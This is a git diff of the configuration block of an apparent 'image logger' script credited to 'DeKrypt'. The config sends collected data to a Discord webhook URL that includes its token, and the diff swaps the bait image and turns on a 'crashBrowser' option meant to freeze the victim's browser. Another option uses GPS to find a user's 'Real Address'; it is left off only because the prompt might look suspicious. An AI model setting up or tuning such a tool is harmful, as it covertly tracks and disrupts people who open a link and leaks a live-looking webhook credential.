@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1334880461129781421/cqX-Z_dsGbiXkPdzpGH_zDkEqu8XjWlGZcDG7xF-ORdl842Mkf0yDqEsBea2036IKpYJ",
-    "image": "https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png", # You can also have a custom image by using a URL argument
+    "image": "https://www.google.com/imgres?q=image%20jpg&imgurl=https%3A%2F%2Fupload.wikimedia.org%2Fwikipedia%2Fcommons%2Fthumb%2F3%2F3a%2FCat03.jpg%2F481px-Cat03.jpg&imgrefurl=https%3A%2F%2Fen.m.wikipedia.org%2Fwiki%2FFile%3ACat03.jpg&docid=dom--IhFjsnP_M&tbnid=1ddA5IcbVx5ENM&vet=12ahUKEwi_gbKujqCLAxUuUkEAHZayIzkQM3oECG4QAA..i&w=481&h=480&hcb=2&ved=2ahUKEwi_gbKujqCLAxUuUkEAHZayIzkQM3oECG4QAA", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -22,7 +22,7 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
